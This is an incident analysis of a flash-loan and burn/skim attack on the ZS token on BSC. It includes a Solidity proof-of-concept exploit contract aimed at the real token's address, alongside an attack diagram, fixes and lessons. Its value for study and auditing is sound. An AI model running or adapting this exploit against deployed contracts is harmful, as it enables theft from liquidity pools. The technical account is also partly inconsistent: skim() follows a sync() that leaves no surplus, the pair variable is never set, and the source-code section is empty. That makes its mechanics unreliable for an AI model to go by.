# ZS Flash Loan Skim/Sync Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | ZS Token |
| Date | 2023-10-31 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$14,000 USD |
| Attack Type | Flash Loan + Skim/Sync Reserve Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e` |
| Attack Contract | `0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e` |
| Vulnerable Contract | `0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC` (ZS Token) |
| Fork Block | BSC |

## 2. Vulnerability Code Analysis

ZS Token is a small-scale DeFi token deployed on BSC. Its `destory_pair_amount()` function could forcibly burn the pair's token balance. The attacker borrowed WBNB via a flash loan to purchase ZS, then called `destory_pair_amount()` to burn the ZS balance held in the pair, creating a reserve imbalance. They then used `skim()` to extract the surplus tokens and sold them for profit.

```solidity
// Vulnerable pattern: destory_pair_amount + skim combination
contract ZSToken {
    address public pair;

    // Vulnerable: burns tokens from the pair without access control
    function destory_pair_amount(uint256 amount) external {
        // Forcibly burn ZS balance held in the pair
        _burn(pair, amount);
        // Call sync() to update reserves
        IUniswapV2Pair(pair).sync();
        // After burn: WBNB reserves unchanged, ZS reserves decreased
        // → ZS/WBNB ratio skewed → excess WBNB extractable via skim()
    }
}
```

**Vulnerability**: The `destory_pair_amount()` function was callable by anyone, allowing arbitrary burning of ZS tokens held in the pair. After the burn, `sync()` updated the reserves, distorting the AMM price, enabling the attacker to sell a large amount of ZS and receive more WBNB in return.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Skim/Sync Reserve Manipulation
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e]
  │
  ├─1─▶ Flash Loan (borrow large amount of WBNB)
  │      PancakeSwap DPP or BSC-based flash loan
  │
  ├─2─▶ Swap WBNB → ZS (buy large amount of ZS)
  │      Acquire ZS through PancakeSwap Pair
  │
  ├─3─▶ ZSToken.destory_pair_amount(amount)
  │      [ZS: 0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC]
  │      Forcibly burn ZS held in the pair
  │      → Internal call to IUniswapV2Pair(pair).sync()
  │      → ZS reserves decrease, WBNB reserves remain unchanged
  │
  ├─4─▶ Pair.skim(address(this))
  │      Retrieve surplus WBNB
  │
  ├─5─▶ Swap held ZS → WBNB
  │      Sell at favorable ratio under distorted price conditions
  │
  └─6─▶ Repay flash loan + realize ~$14,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IZST {
    function destory_pair_amount(uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
    function token0() external view returns (address);
}

contract ZSExploit {
    IZST zs = IZST(0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC);
    IUniswapV2Pair zsPair;
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // Flash loan: borrow WBNB
        // Obtain WBNB via DPP or flash swap
        zsPair.swap(0, 1000 ether, address(this), abi.encode("flash"));
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // Buy ZS with WBNB
        WBNB.transfer(address(zsPair), amount1);
        (uint112 r0, uint112 r1,) = zsPair.getReserves();
        uint256 zsOut = getAmountOut(amount1, r1, r0);
        zsPair.swap(zsOut, 0, address(this), "");

        // Burn ZS held in the pair via destory_pair_amount
        uint256 pairZSBalance = IERC20(address(zs)).balanceOf(address(zsPair));
        zs.destory_pair_amount(pairZSBalance * 80 / 100);

        // Retrieve surplus assets via skim
        zsPair.skim(address(this));

        // Sell held ZS
        uint256 zsBalance = IERC20(address(zs)).balanceOf(address(this));
        IERC20(address(zs)).transfer(address(zsPair), zsBalance);
        (r0, r1,) = zsPair.getReserves();
        uint256 wbnbOut = getAmountOut(zsBalance, r0, r1);
        zsPair.swap(0, wbnbOut, address(this), "");

        // Repay flash loan
        WBNB.transfer(address(zsPair), amount1 * 1004 / 1000);
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 9975;
        return amountInWithFee * reserveOut / (reserveIn * 10000 + amountInWithFee);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | AMM reserve manipulation via unrestricted burn function |
| Impact Scope | ZS/WBNB PancakeSwap Pair |
| Explorer | [BSCscan](https://bscscan.com/address/0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC) |

## 6. Security Recommendations

```solidity
// Fix 1: Add access control to destory_pair_amount
address public owner;

modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

function destory_pair_amount(uint256 amount) external onlyOwner {
    _burn(pair, amount);
    IUniswapV2Pair(pair).sync();
}

// Fix 2: Limit burn amount
uint256 public constant MAX_DESTORY_PERCENT = 5; // Max 5% burn

function destory_pair_amount(uint256 amount) external onlyOwner {
    uint256 pairBalance = balanceOf(pair);
    require(amount <= pairBalance * MAX_DESTORY_PERCENT / 100, "Too much burn");
    _burn(pair, amount);
    IUniswapV2Pair(pair).sync();
}

// Fix 3: Remove the burn function entirely
// Remove any function that allows external burning of tokens held in the pair
// Privileged functions that can manipulate pair balances are critical attack surfaces in AMM security
```

## 7. Lessons Learned

1. **Danger of privileged burn functions**: Functions like `destory_pair_amount()` that allow direct external manipulation of AMM pair balances become an attack surface. Functions in token contracts that act directly on pair balances should be minimized.
2. **skim/sync abuse pattern**: A recurring pattern in BSC DeFi attacks is skewing reserves via burns or forced transfers, then extracting the surplus with `skim()`. All reserve update paths must be audited.
3. **State-mutating functions without access control**: Functions that modify token supply or pair state without access control can be combined with flash loans to mount attacks.
4. **Vulnerability of small-cap BSC tokens**: Small-scale DeFi tokens on BSC are repeatedly exploited due to custom functions that interact with PancakeSwap pairs. AMM interaction security must be reviewed during the feature design phase.